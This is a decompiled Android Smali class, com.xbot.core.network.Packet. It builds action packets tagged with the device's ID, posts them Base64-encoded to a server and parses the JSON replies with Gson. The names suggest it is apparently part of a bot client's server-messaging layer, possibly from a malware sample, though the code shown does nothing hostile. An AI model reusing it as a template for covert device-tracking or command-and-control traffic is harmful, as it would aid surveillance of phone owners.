.class public Lcom/xbot/core/network/Packet;
.super Ljava/lang/Object;
.source "Packet.java"


# instance fields
.field public action:Ljava/lang/String;

.field private clazz:Ljava/lang/Class;

.field public deviceID:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .prologue
    .line 23
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    .line 17
    const-string v0, ""

    iput-object v0, p0, Lcom/xbot/core/network/Packet;->action:Ljava/lang/String;

    .line 18
    const-string v0, ""

    iput-object v0, p0, Lcom/xbot/core/network/Packet;->deviceID:Ljava/lang/String;

    .line 20
    const/4 v0, 0x0

    iput-object v0, p0, Lcom/xbot/core/network/Packet;->clazz:Ljava/lang/Class;

    .line 24
    invoke-static {}, Lcom/xbot/core/RunService;->getService()Lcom/xbot/core/RunService;

    move-result-object v0

    invoke-virtual {v0}, Lcom/xbot/core/RunService;->getDeviceID()Ljava/lang/String;

    move-result-object v0

    iput-object v0, p0, Lcom/xbot/core/network/Packet;->deviceID:Ljava/lang/String;

    .line 25
    return-void
.end method

.method public static get(Lcom/xbot/core/network/Packet;Ljava/lang/Class;)Ljava/lang/Object;
    .locals 3
    .param p0, "o"    # Lcom/xbot/core/network/Packet;
    .param p1, "c"    # Ljava/lang/Class;

    .prologue
    .line 47
    invoke-static {p0}, Lcom/xbot/core/Network;->postBase64(Lcom/xbot/core/network/Packet;)Ljava/lang/String;

    move-result-object v0

    .line 48
    .local v0, "get":Ljava/lang/String;
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "Packet.get: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v1}, Lcom/xbot/core/Log;->write(Ljava/lang/String;)V

    .line 50
    invoke-static {v0, p1}, Lcom/xbot/core/network/Packet;->getObject(Ljava/lang/String;Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    return-object v1
.end method

.method public static getObject(Ljava/lang/String;Ljava/lang/Class;)Ljava/lang/Object;
    .locals 2
    .param p0, "json"    # Ljava/lang/String;
    .param p1, "c"    # Ljava/lang/Class;

    .prologue
    .line 40
    new-instance v0, Lcom/google/gson/Gson;

    invoke-direct {v0}, Lcom/google/gson/Gson;-><init>()V

    .line 42
    .local v0, "g":Lcom/google/gson/Gson;
    invoke-virtual {v0, p0, p1}, Lcom/google/gson/Gson;->fromJson(Ljava/lang/String;Ljava/lang/Class;)Ljava/lang/Object;

    move-result-object v1

    return-object v1
.end method


# virtual methods
.method public getJSON()Ljava/lang/String;
    .locals 2

    .prologue
    .line 34
    new-instance v0, Lcom/google/gson/Gson;

    invoke-direct {v0}, Lcom/google/gson/Gson;-><init>()V

    .line 35
    .local v0, "g":Lcom/google/gson/Gson;
    invoke-virtual {v0, p0}, Lcom/google/gson/Gson;->toJson(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v1

    return-object v1
.end method

.method public init(Ljava/lang/String;)V
    .locals 0
    .param p1, "actionName"    # Ljava/lang/String;

    .prologue
    .line 29
    iput-object p1, p0, Lcom/xbot/core/network/Packet;->action:Ljava/lang/String;

    .line 30
    return-void
.end method
